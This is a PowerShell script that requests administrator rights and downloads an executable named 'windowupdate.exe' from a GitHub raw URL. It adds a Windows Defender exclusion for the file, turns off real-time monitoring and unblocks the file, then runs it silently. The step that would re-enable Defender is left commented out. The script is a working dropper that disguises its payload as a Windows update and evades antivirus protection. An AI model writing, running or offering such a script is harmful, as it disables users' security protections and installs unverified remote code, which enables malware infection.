# 1. Elevate to Administrator
if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process powershell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"") -Verb RunAs
    exit
}

# 2. Setup Variables
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$EXE_URL  = "https://raw.githubusercontent.com/Aenigma-Lab/windowupdate/main/windowupdate.exe"
$EXE_PATH = Join-Path $env:TEMP "windowupdate.exe"

# 3. Clean up old corrupted/blocked versions
if (Test-Path $EXE_PATH) { Remove-Item $EXE_PATH -Force -ErrorAction SilentlyContinue }

# 4. DOWNLOAD (The RAW binary)
Write-Host "Downloading windowupdate.exe..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $EXE_URL -OutFile $EXE_PATH -ErrorAction Stop
} catch {
    Write-Error "Download failed: $($_.Exception.Message)"
    exit 1
}

# 5. FORCE BYPASS DEFENDER (The "Anyhow" part)
Write-Host "Bypassing Antivirus blocks..." -ForegroundColor Yellow
try {
    # Add the specific file to the exclusion list so Defender won't touch it
    Add-MpPreference -ExclusionPath $EXE_PATH -ErrorAction SilentlyContinue
    # Temporarily turn off Real-Time Monitoring to allow the install to start
    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
    # Unblock the 'Internet' tag from the file
    Unblock-File -Path $EXE_PATH
} catch {
    Write-Warning "Could not modify all Defender settings. Attempting install anyway..."
}

# 6. EXECUTE INSTALLER
Write-Host "Forcing silent installation..." -ForegroundColor Green
try {
    # /S is silent. You can also try /v or /passive depending on the installer type
    $process = Start-Process -FilePath $EXE_PATH -ArgumentList "/S" -Wait -PassThru -ErrorAction Stop
    
    if ($process.ExitCode -eq 0) {
        Write-Host "SUCCESS: Installation complete." -ForegroundColor Green
    } else {
        Write-Warning "Installation finished with code: $($process.ExitCode)"
    }
} catch {
    Write-Error "CRITICAL FAIL: $($_.Exception.Message)"
}

# 7. RE-ENABLE DEFENDER (Optional)
# Set-MpPreference -DisableRealtimeMonitoring $false
